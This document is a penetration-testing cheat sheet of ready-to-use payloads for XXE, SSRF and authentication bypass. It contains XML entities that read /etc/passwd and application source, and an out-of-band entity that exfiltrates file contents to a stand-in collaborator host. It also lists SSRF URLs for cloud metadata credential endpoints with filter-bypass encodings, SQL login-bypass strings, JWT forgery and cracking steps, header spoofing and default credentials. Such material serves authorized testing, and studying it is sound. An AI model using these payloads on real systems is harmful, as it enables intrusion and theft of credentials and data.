# XXE — XML External Entity Injection

> **Authorized use only.**

## Detection

**When to test:** Any endpoint that accepts XML input:
- SOAP APIs
- File upload (DOCX, SVG, XML)
- REST APIs with `Content-Type: application/xml`
- RSS/Atom feeds

Change `Content-Type: application/json` to `application/xml` and send:
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe "test">]>
<root>&xxe;</root>
```
If `test` appears in the response → XXE confirmed.

---

## Classic — File Read

**When to use:** XXE confirmed, output reflected in response  
**Platform:** Any XML parser  
**Risk of detection:** High

```xml
<!-- Read /etc/passwd -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Read Windows file -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>

<!-- Read PHP source (base64) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root>&xxe;</root>
```

---

## XXE to SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

---

## Blind OOB — Out-of-Band

**When to use:** No output in response — exfiltrate via DNS/HTTP  
**Requires:** Burp Collaborator or interactsh

```xml
<!-- Basic OOB via HTTP -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR.com/xxe-test">
]>
<root>&xxe;</root>

<!-- Exfiltrate file content via HTTP parameter -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-COLLABORATOR.com/?x=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>
```

---

# SSRF — Server-Side Request Forgery

> **Authorized use only.**

## Detection

**When to test:**
- URL parameters (`?url=`, `?path=`, `?file=`, `?image=`, `?redirect=`)
- Webhook URL fields
- PDF generators that fetch URLs
- Image import from URL

```
# Basic callback — use Burp Collaborator
?url=http://YOUR-COLLABORATOR.com
?webhook=http://YOUR-COLLABORATOR.com
?file=http://YOUR-COLLABORATOR.com
```

---

## Internal Network Scan

```
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
http://127.1/
http://127.0.1/
http://0/

# Internal ports
http://localhost:22
http://localhost:3306
http://localhost:5432
http://localhost:6379
http://localhost:27017
http://localhost:8080
http://localhost:8443
http://192.168.0.1/
http://10.0.0.1/
```

---

## Cloud Metadata — AWS

**When to use:** SSRF on AWS-hosted app

```
# IMDSv1 (no auth required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/

# Link-local IPv6
http://[fd00:ec2::254]/latest/meta-data/

# DNS alternative
http://instance-data/latest/meta-data/
```

---

## Cloud Metadata — GCP / Azure

```
# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

---

## SSRF Filter Bypass

```
# When 127.0.0.1 is blocked
http://localhost/
http://127.1/
http://127.0.1/
http://0/
http://[::1]/
http://0x7f000001/        ← hex
http://2130706433/        ← decimal
http://0177.0.0.1/        ← octal

# DNS rebinding — point domain to 127.0.0.1
http://yourdomain.com/    ← DNS resolves to 127.0.0.1

# Open redirect chain
?url=https://trusted.com/redirect?to=http://169.254.169.254/

# URL scheme alternatives
dict://localhost:6379/info
gopher://localhost:6379/...
file:///etc/passwd
```

---

# Auth Bypass Payloads

> **Authorized use only.**

## SQL Login Bypass

```sql
# Username field
admin'--
admin'/*
admin'#
' OR 1=1--
' OR '1'='1'--
admin' OR '1'='1
') OR ('1'='1
admin'/**/--

# Both fields
' OR 1=1--   /  anything
' OR 'x'='x  /  ' OR 'x'='x
```

---

## JWT Attacks

**When to use:** App uses JWT for authentication

```bash
# 1. Decode JWT (base64 each part)
echo "eyJ..." | base64 -d

# 2. Algorithm confusion — change alg to "none"
# Header: {"alg":"none","typ":"JWT"}
# Remove signature, keep trailing dot
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.

# 3. RS256 → HS256 confusion
# If public key available, sign HS256 with it

# 4. Weak secret bruteforce
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# 5. kid injection — if kid parameter used
# kid: ../../../../dev/null
# Sign with empty string as secret
```

---

## HTTP Header Manipulation

**When to use:** App trusts forwarded headers for internal access

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-IP: 127.0.0.1
X-Forwarded-Host: localhost
X-Custom-IP-Authorization: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Admin access via host header
Host: localhost
Host: admin.internal
```

---

## Default Credentials Reference

| App | Username | Password |
|-----|----------|----------|
| Admin panels | `admin` | `admin` `password` `1234` `admin123` |
| MySQL | `root` | *(empty)* `root` `toor` |
| PostgreSQL | `postgres` | `postgres` *(empty)* |
| MongoDB | *(no auth)* | — |
| Redis | *(no auth)* | — |
| Jenkins | `admin` | *(see /var/jenkins_home/secrets/initialAdminPassword)* |
| Tomcat | `tomcat` `admin` | `tomcat` `admin` `s3cret` |
| Grafana | `admin` | `admin` |
| phpMyAdmin | `root` | *(empty)* |
| DVWA | `admin` | `password` |
| Juice Shop | `admin@juice-sh.op` | `admin123` |
